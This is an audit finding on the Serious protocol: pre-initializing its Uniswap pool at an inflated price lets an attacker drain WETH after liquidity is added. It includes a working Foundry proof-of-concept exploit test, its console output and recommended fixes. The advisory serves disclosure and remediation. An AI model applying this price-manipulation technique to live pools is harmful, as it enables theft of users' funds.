---
tags:
  - lang/solidity
  - sector/dex
  - sector/options
  - sector/token
  - platform/pashov
  - has/github
  - has/poc
  - severity/high
  - impact/data-corruption/price-manipulation
  - impact/mev/frontrun
  - trigger/price-manipulation
protocol: "[[Serious]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/Serious-security-review.md"
genome:
  - "[[spot-price]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[frontrun]]"
  - "[[trigger/price-manipulation]]"
  - "[[frontrun-exposure]]"
  - "[[oracle-manipulation-resistance]]"
---
# [C-02] Uniswap's pool can be initialized with a different price

- id: 36318
- impact: HIGH
- protocol: [[Serious]]
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/Serious-security-review.md

## Summary


This bug report describes a potential issue with a function called `SeriousMarket.createPoolAndAddLiquidity`. This function is used to create and initialize a pool for a specific token and WETH pair. However, if the pool already exists and the current price is different from the target initial price, not all of the intended liquidity is added to the pool. This can lead to a situation where a malicious user can manipulate the price and steal a large amount of WETH from the pool. The report suggests two potential solutions, either creating the token inside the function or using a wrapper token, to prevent this attack. It also recommends removing a check for pool existence and using a salt to prevent front-running attacks. 

## Details

**Severity**

**Impact:** High

**Likelihood:** High

**Description**

`SeriousMarket.createPoolAndAddLiquidity` creates and initializes a Uniswap pool for the token-WETH pair only if the pool does not exist. Then liquidity is added to the pool at the current price.

In case the pool exists and the current price is different from the target initial price, not all the liquidity is added to the pool.

In case the price for the token is higher than the target price, fewer tokens will be added to the pool and the remaining tokens will be burned. In case the price is lower, fewer WETH will be added to the pool and the remaining WETH will be stuck in the contract.

A malicious user can create the pool with a very high price and after the liquidity is added, swap a small amount of tokens in exchange for most of the WETH in the pool.

**Proof of Concept**

Test:

```solidity
function testCreatePoolOutsideMarket() public {
    vm.deal(ownerAddress, 10 ether);
    vm.deal(userAddress, 1 ether);
    uint256 userInitialBalance = userAddress.balance;
    uint256 userBuyAmount = 1;

    // User buys 1 token and owner buys the rest
    buy(userAddress, userBuyAmount);
    buy(ownerAddress, seriousMarket.tradeableSupply() - userBuyAmount);

    vm.startPrank(ownerAddress);

    // Create pool and initialize with very high price
    address pool = IUniswapV3Factory(uniswapFactoryAddress).createPool(wethAddress, tokenAddress, seriousMarket.poolFee());
    IUniswapV3Pool(pool).initialize(1e40);

    // Add liquidity from market
    seriousMarket.createPoolAndAddLiquidity(tokenAddress);

    // Swap 1 token for WETH
    ERC20(tokenAddress).approve(swapRouterAddress, userBuyAmount * 1e18);
    IV3SwapRouter.ExactInputSingleParams memory params = IV3SwapRouter.ExactInputSingleParams({
    tokenIn: tokenAddress,
    tokenOut: wethAddress,
    fee: seriousMarket.poolFee(),
    recipient: ownerAddress,
    amountIn: userBuyAmount * 1e18,
    amountOutMinimum: 0,
    sqrtPriceLimitX96: 0
    });
    uint256 amountOut = IV3SwapRouter(swapRouterAddress).exactInputSingle(params);

    vm.stopPrank();

    console2.log("ETH spent: %e", userInitialBalance - userAddress.balance);
    console2.log("WETH received: %e", amountOut);
}

function buy(address buyer, uint256 amount) public {
    (, uint256 tokensSold, ) = seriousMarket.tokenDatas(tokenAddress);
    uint256 buyCost = seriousMarket.getEthValueForTrade(int256(tokensSold), int256(amount));
    uint256 buyFee = seriousMarket.getBuyFee(buyCost);
    vm.prank(buyer);
    seriousMarket.buyToken{value: buyCost + buyFee}(address(token), amount, bytes8(0));
}
```

Console output:

```js
ETH spent: 1.010000015e9
WETH received: 7.031734957878102476e18
```

**Recommendations**

Consider creating the token inside `createPoolAndAddLiquidity` and using internal accounting for buys and sells in the form of token claims, that can be exchanged once the token is created.

Another option, that would allow transferring the tokens before the pool is created, would be using a wrapper token that can be exchanged for the real token once the pool is created.

In order to prevent a front-running attack, where a user pre-computes the new token address and creates and initializes the pool, it would be required to remove the check for pool existence (it will revert if the pool is already initialized) and pass a salt to create the token using `create2`, so that `createPoolAndAddLiquidity` does not turn into a no-op.
